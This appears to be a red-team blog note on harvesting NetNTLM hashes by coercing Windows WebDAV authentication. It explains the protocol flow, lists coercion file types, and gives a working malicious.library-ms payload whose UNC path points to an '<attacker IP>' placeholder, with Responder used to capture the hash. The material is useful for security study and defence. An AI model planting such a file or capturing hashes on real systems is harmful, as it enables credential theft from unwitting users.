+++
title = "Harvesting NetNTLM"
author = ["Kyle Bednar"]
draft = false
+++

## Harvesting NetNTLM {#harvesting-netntlm}

Obtaining hashes from SMB (445) is non-trivial without administrator rights and even then the approaches may not be desirable from an OpSec perspective. An alternate approach is over HTTP by abusing the WebDAV Mini-Redirector.

Distributed Authoring and Versioning (DAV) is an extension of the HTTP protocol that facilitates file sharing over HTTP. Windows implements WebDAV using the WebClient service, which has the purpose of making file interactions through native API calls seamless for Windows applications; that is it’s treated as a remote file system. The beauty of this is that the remote HTTP server can operate on any port, providing significant flexibility from a red team perspective and allows us to avoid tackling the already bound SMB port.

When a file operation is triggered to the WebDAV enabled UNC path, the authenticating host will do the following:

-   Issue an OPTIONS method to discover what the supported features are of the web server,
-   If PROPFIND is supported, a PROPFIND request method is issued to discover the directory structure,
-   If the web server responds with a 401 Unauthorised and a request for NTLM authentication via the WWW-Authenticate header, the WebDAV Mini-Redirector will then proceed to initiate the NTLM challenge response authentication which ultimately supplies the NetNTLM hash to the web server.


### Coercing Authentication {#coercing-authentication}

One of the most well known techniques for forcing this authentication is through an SCF file, although this appears to have been resolved.  The idea is that a remotely hosted icon gets parsed by explorer, causing a remote authentication to the location pointed to by the UNC path (eg the Farmer WebDAV service). Short list of file types:

-   Windows Shortcuts (.lnk)
-   URL files (.url)
-   Windows Library Files (.library-ms)
-   Windows Search Connectors (.searchConnector-ms)


#### Windows Library Files {#windows-library-files}

Uploading a zip file that gets extracted, where zip contains `malicious.library-ms`:

```shell { linenos=true, linenostart=1 }
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<attacker IP>\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

We harvest the hash with Responder:

{{< figure src="/images/ntlm_harvest.png" >}}

Sources: [MDSec ](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/)[cti.monster](https://cti.monster/blog/2025/03/18/CVE-2025-24071.html)
